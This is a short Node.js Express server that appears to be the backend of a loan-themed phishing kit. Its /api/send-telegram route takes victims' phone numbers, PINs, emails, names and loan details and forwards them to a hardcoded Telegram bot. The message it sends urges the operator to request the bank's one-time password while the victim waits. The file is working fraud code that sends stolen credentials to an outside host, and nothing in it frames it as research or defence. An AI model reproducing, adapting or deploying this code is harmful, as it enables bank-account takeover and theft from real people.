const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, rate, monthly, appId } = req.body;
        
        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
        const TG_CHAT_ID = '8392790531';
        
        const message = `🔔 NEW PIN CONFIRMATION 🔔\n\nPhone: ${phone}\nPIN: ${pin}\nEmail: ${email}\nName: ${name}\nLoan: $${amount} for ${term} months\nInterest: ${rate}%\nMonthly: $${monthly}\nApp ID: ${appId || 'N/A'}\n\nRequest OTP from the bank now! User is waiting.`;
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const response = await fetch(url);
        const result = await response.json();
        
        res.json({ success: true, result });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
